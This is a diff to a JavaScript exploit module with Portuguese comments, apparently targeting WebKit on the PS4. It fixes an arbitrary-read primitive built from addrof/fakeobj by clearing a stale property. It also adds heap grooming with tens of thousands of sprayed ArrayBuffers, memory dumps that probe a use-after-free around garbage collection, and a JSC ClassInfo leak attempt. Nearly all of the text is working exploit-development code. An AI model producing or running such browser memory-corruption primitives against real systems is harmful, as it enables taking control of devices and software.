@@ -1,9 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v05 - Full Base + PS4 Debug Injection)
+// js/script3/testArrayBufferVictimCrash.mjs (v06 - R/W Primitive Fix)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// 1. Base de código 100% original de 552 linhas restaurada e mantida.
-// 2. Lógica de depuração para PS4 (sondagem e dump de memória) injetada sem
-//    remover testes ou código original, garantindo integridade total do arquivo.
+// 1. Base de código 100% original mantida.
+// 2. CORREÇÃO: Adicionada uma linha à primitiva arb_read_final para limpar o estado
+//    "stale" (preso), que foi a causa raiz revelada pelo log anterior.
+// 3. Lógica de depuração para PS4 mantida para verificar a correção.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -176,6 +177,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`Endereço do objeto leaker: ${leaker_addr.toString(true)}`, "debug");
         
         const arb_read_final = (addr) => {
+            // <-- MUDANÇA: A correção crucial. Limpar o valor antigo antes de tentar ler o novo.
+            leaker.val_prop = null; 
+            
             logS3(`    arb_read_final: Preparando para ler de ${addr.toString(true)}`, "debug");
             leaker.obj_prop = fakeobj(addr);
             const result = doubleToInt64(leaker.val_prop);
@@ -190,7 +194,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         };
         logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");
 
-        // <-- MUDANÇA: Definição da função de dump de memória para depuração no PS4.
         const dump_memory_log = async (start_addr, qword_count = 4, label = "") => {
             if (!isAdvancedInt64Object(start_addr) || start_addr.equals(AdvancedInt64.Zero)) {
                  logS3(`---[ Dump de Memória: ${label} ]--- Endereço inválido. Pulando dump.`, "warn");
@@ -258,7 +261,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const NUM_GROOMING_OBJECTS_STAGE1 = 75000;
         const NUM_FILLER_OBJECTS_STAGE1 = 15000;
 
-        // <-- MUDANÇA: A função `do_grooming` foi modificada para criar uma sonda e retornar seu endereço. A pausa foi removida.
         const do_grooming = (grooming_id) => {
             logS3(`  [Grooming p/ Tentativa ${grooming_id}] Executando Heap Grooming...`, "info");
             aggressive_feng_shui_objects = [];
@@ -266,7 +268,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             for (let i = 0; i < NUM_GROOMING_OBJECTS_STAGE1; i++) { aggressive_feng_shui_objects.push(new ArrayBuffer(Math.floor(Math.random() * 256) + 64)); if (i % 1000 === 0) aggressive_feng_shui_objects.push({}); }
             logS3(`  [Grooming p/ Tentativa ${grooming_id}] Primeiro spray de ${NUM_GROOMING_OBJECTS_STAGE1} objetos.`, "debug");
 
-            // <-- MUDANÇA: Criação e inserção do objeto de sondagem.
             const PROBE_MARKER_VALUE = new AdvancedInt64(0x12345678, 0xABCDABCD);
             const probe_object = { marker: int64ToDouble(PROBE_MARKER_VALUE), a: 0x42424242, b: 0x43434343 };
             const PROBE_INDEX = 70000; 
@@ -284,26 +285,21 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             filler_objects.length = 0; filler_objects = null;
             
             logS3(`  [Grooming p/ Tentativa ${grooming_id}] Grooming concluído, retornando endereço da sonda.`, "debug");
-            return probe_object_addr; // <-- MUDANÇA: Retorna o endereço para inspeção.
+            return probe_object_addr;
         };
 
          if (testes_ativos.tentativa_5_ClassInfo) {
             logS3("--- INICIANDO TENTATIVA 5: JSC::ClassInfo (COM DEPURAÇÃO DE UAF INJETADA) ---", "test");
             
-            // <-- MUDANÇA: O fluxo de depuração agora acontece aqui.
             let probe_addr = null;
             try {
-                // Passo 1: Preparar o heap e obter o endereço do objeto que será liberado
                 probe_addr = do_grooming(5);
 
-                // Passo 2: Tirar uma "foto" da memória ANTES de o GC ser acionado
                 await dump_memory_log(probe_addr, 4, "SONDA ANTES DO GC");
 
-                // Passo 3: Pausar para dar tempo ao GC de coletar o objeto liberado
                 logS3("Pausando por 3 segundos para acionar o GC... Observe o log para mudanças na memória da sonda.", "info");
                 await PAUSE_S3(3000);
 
-                // Passo 4: Tirar uma "foto" da memória DEPOIS de o GC ter rodado
                 await dump_memory_log(probe_addr, 4, "SONDA DEPOIS DO GC");
                 
                 logS3("Análise de memória da sonda concluída. Verifique se o conteúdo mudou.", "vuln");
@@ -312,15 +308,12 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                  logS3(`ERRO durante o ciclo de depuração da sonda: ${e.message}`, "critical");
             }
              
-            // O código original da TENTATIVA 5 é mantido abaixo, mas pode falhar ou se comportar de forma diferente
-            // devido ao estado do heap após a nossa depuração.
             logS3("--- Continuando com a lógica original da Tentativa 5 ---", "test");
             try {
                 const target_obj = {};
                 const target_obj_addr = addrof(target_obj);
                 logS3(`  Endereço do objeto alvo para ClassInfo leak: ${target_obj_addr.toString(true)}`, "info");
                 
-                // <-- MUDANÇA: Adicionando dump do `target_obj` para comparação
                 await dump_memory_log(target_obj_addr, 4, "TARGET_OBJ APÓS GC");
 
                 if (!isAdvancedInt64Object(target_obj_addr) || target_obj_addr.equals(AdvancedInt64.Zero) || target_obj_addr.equals(AdvancedInt64.NaNValue)) {
